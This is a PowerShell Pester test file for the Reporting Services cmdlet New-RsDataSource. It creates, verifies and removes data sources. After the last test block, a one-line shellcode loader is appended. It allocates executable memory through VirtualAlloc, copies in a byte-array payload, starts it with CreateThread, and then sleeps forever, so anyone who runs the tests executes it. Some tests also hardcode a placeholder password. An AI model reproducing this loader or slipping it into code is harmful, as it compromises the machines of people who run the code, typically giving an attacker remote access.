


Function Create-PSCredential
{
    param(
            [Parameter(Mandatory = $True)]
            [string]$UserName,
            [Parameter(Mandatory = $True)]
            [string]$Password
        )
       $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
       $ps_credential = New-Object System.Management.Automation.PSCredential ($UserName, $SecurePassword)
       Return $ps_credential 
}

Function Get-ExistingDataExtension
{
        $proxy = New-RsWebServiceProxy
        return $proxy.ListExtensions("Data")[0].Name
}

Describe "New-RsDataSource" {
    Context "Create RsDataSource with minimal parameters"{
        
        $dataSourceName = 'SutDataSourceMinParameters' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $dataSourcePath = '/' + $dataSourceName
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval
        $dataSource = Get-RsDataSource -Path $dataSourcePath
        It "Should be a new data source" {
            $dataSource.Count | Should Be 1
            $dataSource.Extension | Should Be $extension
            $dataSource.CredentialRetrieval | Should Be $credentialRetrieval

        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with ReportServerUri parameter"{
        
        $dataSourceName = 'SutDataSourceReportServerUriParameter' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $reportServerUri = 'http://localhost/reportserver'
        $dataSourcePath = '/' + $dataSourceName
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -ReportServerUri $reportServerUri
        It "Should be a new data source" {
            {Get-RsDataSource -Path $dataSourcePath } | Should not throw
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with Proxy parameter"{
        
        $dataSourceName = 'SutDataSourceProxyParameter' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $proxy = New-RsWebServiceProxy 
        $dataSourcePath = '/' + $dataSourceName
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -Proxy $proxy
        It "Should be a new data source" {
            {Get-RsDataSource -Path $dataSourcePath } | Should not throw
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with connection string parameter"{
        
        $dataSourceName = 'SutDataSourceConnectionStringParameter' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $connectionString =  'Data Source=localhost;Initial Catalog=ReportServer'
        $dataSourcePath = '/' + $dataSourceName
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -ConnectionString $connectionString
        $dataSource = Get-RsDataSource -Path $dataSourcePath
        It "Should be a new data source" {
            $dataSource.Count | Should Be 1
            $dataSource.Extension | Should Be $extension
            $dataSource.CredentialRetrieval | Should Be $credentialRetrieval
            $dataSource.ConnectString | Should Be $connectionString
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with Proxy and ReportServerUri parameters"{
        
        $dataSourceName = 'SutDataSourceProxyAndReportServerUriParameters' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $proxy = New-RsWebServiceProxy 
        $dataSourcePath = '/' + $dataSourceName
        $reportServerUri = 'http://localhost/reportserver'
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -Proxy $proxy -ReportServerUri $reportServerUri
        It "Should be a new data source" {
            {Get-RsDataSource -Path $dataSourcePath } | Should not throw
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

     Context "Create RsDataSource with unsupported RsDataSource Extension validation"{
        
        $dataSourceName = 'SutDataSurceExtensionException' + [guid]::NewGuid()
        $extension = 'InvalidExtension'
        $credentialRetrieval = 'Integrated'
        $dataSourcePath = '/' + $dataSourceName
        It "Should throw an exception when datasource is failed to be create" {
             { New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval } | Should throw 
             { Get-RsDataSource -Path $dataSourcePath } | Should throw
        }
    }

    Context "Create RsDataSource with STORE credential validation" {
        
        $dataSourceName = 'SutDataSurceStoreException' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'Store'
        $dataSourcePath = '/' + $dataSourceName
        It "Should throw an exception when Store credential retrieval are given without providing credential" {
            { New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval } | Should throw 
            { Get-RsDataSource -Path $dataSourcePath } | Should throw
        }
    }

    Context "Create RsDataSource with Data Source Credentials" {
        
        $dataSourceName = 'SutDataSurceCredentials' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'Store'
        $dataSourcePath = '/' + $dataSourceName
        
        $password ='MyPassword'
        $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $dataSourceCredentials = Create-PSCredential -User $userName -Password $password
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -DatasourceCredentials $dataSourceCredentials
        It "Should be a new data source" {
            {Get-RsDataSource -Path $dataSourcePath } | Should not throw
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    

    Context "Create RsDataSource with Windows Credentials Parameter"{
        
        $dataSourceName = 'SutDataSurceWindowsCredentials' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'Store'
        $dataSourcePath = '/' + $dataSourceName
        
        $password ='MyPassword'
        $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $dataSourceCredentials = Create-PSCredential -User $userName -Password $password
        
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -DatasourceCredentials $dataSourceCredentials -WindowsCredentials
        $dataSource = Get-RsDataSource -Path $dataSourcePath
        It "Should be a new data source" {
            $dataSource.Count | Should Be 1
            $dataSource.WindowsCredentials | Should Be $true
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with Prompt Credentials Retrieval"{
        
        $dataSourceName = 'SutDataSurcePrompt' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'Prompt'
        $dataSourcePath = '/' + $dataSourceName
        $prompt = "Please enter your username and password"
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -Prompt $prompt
        It "Should be a new data source" {
            {Get-RsDataSource -Path $dataSourcePath } | Should not throw
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource and Overwrite it"{
        
        $dataSourceName = 'SutDataSourceOverwrite' + [guid]::NewGuid()
        $extension = 'SQL'
        $credentialRetrieval = 'Integrated'
        $dataSourcePath = '/' + $dataSourceName
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval
        
        $credentialRetrievalChange = 'None'
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrievalChange -Overwrite
        $dataSource = Get-RsDataSource -Path $dataSourcePath
        It "Should overwrite a datasource" {
            $dataSource.CredentialRetrieval | Should be  $credentialRetrievalChange 
            $dataSource.Count | Should Be 1
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }

    Context "Create RsDataSource with description"{
        
        $dataSourceName = 'SutDataSourceDescription' + [guid]::NewGuid()
        $extension = Get-ExistingDataExtension
        $credentialRetrieval = 'None'
        $dataSourcePath = '/' + $dataSourceName
        $description = 'This is a description'
        New-RsDataSource -RsFolder '/' -Name $dataSourceName -Extension $extension -CredentialRetrieval $credentialRetrieval -Description $description
        $dataSource = Get-RsDataSource -Path $dataSourcePath
        $proxy = New-RsWebServiceProxy
        $properties = $proxy.GetProperties($dataSourcePath, $null)
        It "Should be a new data source" {
            $dataSource.Count | Should Be 1
            $dataSource.Extension | Should Be $extension
            $dataSource.CredentialRetrieval | Should Be $credentialRetrieval
            $descriptionProperty = $properties | Where { $_.Name -eq 'Description' }
            $descriptionProperty | Should Not BeNullOrEmpty
            $descriptionProperty.Value | Should Be $description
            
        }
        
        Remove-RsCatalogItem -RsFolder $dataSourcePath -Confirm:$false
    }
}
$9T1M = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $9T1M -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc3,0xbd,0x96,0x74,0xb7,0xd9,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x6a,0x14,0x03,0x6a,0x82,0x96,0x42,0x25,0x42,0xd4,0xad,0xd6,0x92,0xb9,0x24,0x33,0xa3,0xf9,0x53,0x37,0x93,0xc9,0x10,0x15,0x1f,0xa1,0x75,0x8e,0x94,0xc7,0x51,0xa1,0x1d,0x6d,0x84,0x8c,0x9e,0xde,0xf4,0x8f,0x1c,0x1d,0x29,0x70,0x1d,0xee,0x3c,0x71,0x5a,0x13,0xcc,0x23,0x33,0x5f,0x63,0xd4,0x30,0x15,0xb8,0x5f,0x0a,0xbb,0xb8,0xbc,0xda,0xba,0xe9,0x12,0x51,0xe5,0x29,0x94,0xb6,0x9d,0x63,0x8e,0xdb,0x98,0x3a,0x25,0x2f,0x56,0xbd,0xef,0x7e,0x97,0x12,0xce,0x4f,0x6a,0x6a,0x16,0x77,0x95,0x19,0x6e,0x84,0x28,0x1a,0xb5,0xf7,0xf6,0xaf,0x2e,0x5f,0x7c,0x17,0x8b,0x5e,0x51,0xce,0x58,0x6c,0x1e,0x84,0x07,0x70,0xa1,0x49,0x3c,0x8c,0x2a,0x6c,0x93,0x05,0x68,0x4b,0x37,0x4e,0x2a,0xf2,0x6e,0x2a,0x9d,0x0b,0x70,0x95,0x42,0xae,0xfa,0x3b,0x96,0xc3,0xa0,0x53,0x5b,0xee,0x5a,0xa3,0xf3,0x79,0x28,0x91,0x5c,0xd2,0xa6,0x99,0x15,0xfc,0x31,0xde,0x0f,0xb8,0xae,0x21,0xb0,0xb9,0xe7,0xe5,0xe4,0xe9,0x9f,0xcc,0x84,0x61,0x60,0xf1,0x50,0x1f,0x65,0x65,0x9b,0x48,0x64,0x1c,0x73,0x8b,0x67,0xcf,0xdf,0x02,0x81,0xbf,0x8f,0x44,0x1e,0x7f,0x60,0x25,0xce,0x17,0x6a,0xaa,0x31,0x07,0x95,0x60,0x5a,0xad,0x7a,0xdd,0x32,0x59,0xe2,0x44,0xc8,0xf8,0xeb,0x52,0xb4,0x3a,0x67,0x51,0x48,0xf4,0x80,0x1c,0x5a,0x60,0x61,0x6b,0x00,0x26,0x7e,0x41,0x2f,0xc6,0xea,0x6e,0xe6,0x91,0x82,0x6c,0xdf,0xd5,0x0c,0x8e,0x0a,0x6e,0x84,0x1a,0xf5,0x18,0xe9,0xca,0xf5,0xd8,0xbf,0x80,0xf5,0xb0,0x67,0xf1,0xa5,0xa5,0x67,0x2c,0xda,0x76,0xf2,0xcf,0x8b,0x2b,0x55,0xb8,0x31,0x12,0x91,0x67,0xc9,0x71,0x23,0x5b,0x1c,0xbf,0x51,0xb5,0x9c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uZ4X=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uZ4X.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uZ4X,0,0,0);for (;;){Start-sleep 60};

